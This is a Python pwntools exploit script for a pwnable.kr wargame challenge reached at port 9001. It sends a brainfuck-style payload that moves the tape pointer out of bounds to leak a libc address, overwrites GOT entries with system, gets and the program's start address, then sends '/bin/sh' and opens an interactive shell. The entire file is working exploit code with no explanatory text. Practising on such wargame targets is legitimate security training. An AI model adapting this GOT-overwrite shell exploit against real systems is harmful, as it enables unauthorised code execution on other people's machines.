from pwn import *
import time

context.log_level = 'debug'

p = remote("pwnable.kr", 9001)
system_offset = 0x3a920
#write in sh

print p.recv()
print p.recv()
time.sleep(1)
payload = '<' * 124 + ".>.>.>.>" + "<<<<" * 6 + ",>,>,>,>" + ">>>>" * 6 + ",>,>,>,>" + ",>,>,>,>" + '.'

print payload
p.sendline(payload)

char1 = p.recv(1)
char2 = p.recv(3)
temp = char1 + char2
main_libc = int(u32(temp))
print "libc: " + hex(main_libc)
libc_base = main_libc - 0x18540

system = libc_base + system_offset
fgets = libc_base + 0x5d540
gets = libc_base + 0x5e770

_start = 0x80484e0

p.send(p32(system) + p32(gets) + p32(_start))

raw_input()

p.sendline("/bin/sh")
p.interactive()
